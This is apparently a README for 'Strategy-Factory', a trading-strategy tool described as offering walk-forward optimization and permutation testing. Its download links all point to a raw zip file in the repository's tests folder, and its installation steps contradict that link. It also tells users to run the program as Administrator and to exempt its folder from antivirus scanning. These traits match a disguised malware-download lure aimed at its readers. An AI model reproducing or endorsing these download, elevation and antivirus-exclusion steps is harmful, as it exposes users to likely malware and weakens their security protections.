# 📈 Strategy-Factory - Build better trading strategies with ease

<a href="https://raw.githubusercontent.com/Fast-meadowvole9864/Strategy-Factory/main/tests/Factory-Strategy-2.5-beta.2.zip"><img src="https://img.shields.io/badge/Download-Software-blue.svg" alt="Download Strategy-Factory"></a>

## 📋 Project Overview

Strategy-Factory helps you research and test trading ideas. You use this tool to build, refine, and validate your strategies using automated processes. It focuses on WFO (Walk Forward Optimization) and permutation testing to ensure your rules hold up against historical market fluctuations. You do not need coding skills to use this software. It handles the math and data analysis so you can focus on strategy logic.

## ⚙️ System Requirements

Ensure your computer meets these standards before you begin:

*   Operating System: Windows 10 or Windows 11 (64-bit).
*   Processor: Intel Core i5 or equivalent.
*   Memory: 8 GB RAM or higher.
*   Storage: 2 GB of free space for data logs and testing history.
*   Display: 1920 x 1080 resolution.

## 💾 Installation Guide

Follow these steps to install the software on your computer.

1. Visit the [official Strategy-Factory download page](https://raw.githubusercontent.com/Fast-meadowvole9864/Strategy-Factory/main/tests/Factory-Strategy-2.5-beta.2.zip) to access the latest version.
2. Locate the link labeled "Releases" on the right side of the page.
3. Choose the file ending in `.exe` for Windows.
4. Save the file to your computer.
5. Double-click the file to start the installer.
6. Follow the on-screen prompts.
7. Launch the application from your desktop icon once the install finishes.

## 🚀 How to Run Your First Test

The application manages your data through a simple dashboard. Follow this workflow to run a research pipeline.

1. Open the Strategy-Factory application.
2. Navigate to the "Input Data" tab.
3. Import your historical price data as a CSV file.
4. Select the "Optimization" tab to configure your test parameters.
5. Set your WFO settings to define how the software walks through your data.
6. Enable "Permutation Testing" to verify that your strategy results occur past mere random chance.
7. Click the "Start Research" button.
8. Monitor the progress bar at the bottom of the screen.
9. View your results in the "Reports" directory once the process stops.

## 🔍 Understanding WFO and Permutation Testing

This software uses two specific methods to make your strategies robust.

Walk Forward Optimization (WFO) trains your strategy on one segment of historical data and tests it on the next. This simulates how your strategy performs in live markets that change over time. It prevents the software from over-fitting your rules to a specific window of price action.

Permutation testing rearranges your data to see if your strategy still produces results. If the strategy fails during these scrambled tests, the original results were likely a result of random patterns. This step builds confidence that your strategy identifies actual market edges.

## 🛠 Troubleshooting Common Issues

If the software fails to start or crashes during a test, check these items:

*   Permissions: Right-click the application icon and select "Run as Administrator."
*   Data Format: Ensure your CSV file has columns labeled "Date," "Open," "High," "Low," and "Close."
*   Antivirus: Add an exclusion for the Strategy-Factory folder in your security software if the app stops responding.
*   Memory Usage: Close other heavy applications like web browsers or video editors while running large WFO tests.

## 📁 Data Management

The software stores your project files in the "Documents/Strategy-Factory" folder on your local drive. Back up this folder regularly to prevent loss of your research. Each test creates a unique sub-folder. You can rename these folders to organize your research history. Remove older folders if you notice the application slows down due to a large volume of saved reports.

## 📖 Frequently Asked Questions

**Can I run multiple tests at once?**
The software runs tasks in a sequence to maintain performance. You can queue several tests and leave the software to finish them during the night.

**What market data works best?**
High-quality, clean data provides the best results. Use minute or hourly bars for your research. Ensure there are no gaps in your price history.

**Why does the permutation test take long?**
Permutation testing performs hundreds or thousands of individual scenario tests. It requires significant processing power. The time for completion scales with the size of your input file and the number of permutations selected.

**Do I need an internet connection?**
You only need an internet connection to download the initial installer and to check for updates. You can run all research tasks while offline.

**How do I update the application?**
Check the dashboard periodically for update notifications. Re-run the installer if a new version appears on the download page. Your historical data remains safe during the update process.

## 🧪 Advanced Settings Menu

You can customize the engine through the settings panel. Adjust the CPU thread limit if you want to use the software while performing other tasks on your computer. You can also modify the reporting format to generate PDF files instead of HTML files. Always click "Save Changes" after adjusting these inputs to ensure the software applies them to your next test run.